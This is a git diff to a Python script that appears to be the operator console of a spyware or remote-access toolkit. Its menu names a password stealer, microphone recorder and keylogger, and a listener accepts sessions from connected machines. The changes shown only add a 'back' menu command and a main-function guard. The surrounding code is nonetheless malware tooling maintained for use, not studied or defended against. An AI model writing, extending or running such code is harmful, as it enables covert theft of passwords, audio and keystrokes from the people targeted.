@@ -15,6 +15,7 @@ passwdstealer
 micrecorder
 ***Type no <option> to cancel option***
 ***Type listen to initialize listener***
+***Type back to go to menu***
     '''
 
 keylogger = False
@@ -86,6 +87,8 @@ def main():
             ip = input('Enter Listening IP:>')
             port = int(input('Enter Listening Port:>'))
             listen(ip, port)
+        elif inp == 'back':
+            os.system('python spectre.py')
         else:
             print('unrecognized command')
             time.sleep(1)
@@ -162,4 +165,6 @@ def listen(ip, port):
             print('Connection Established')
             print('Session Created with' , addr)
             connect()
-main()
+
+if __name__=='__main__':
+    main()
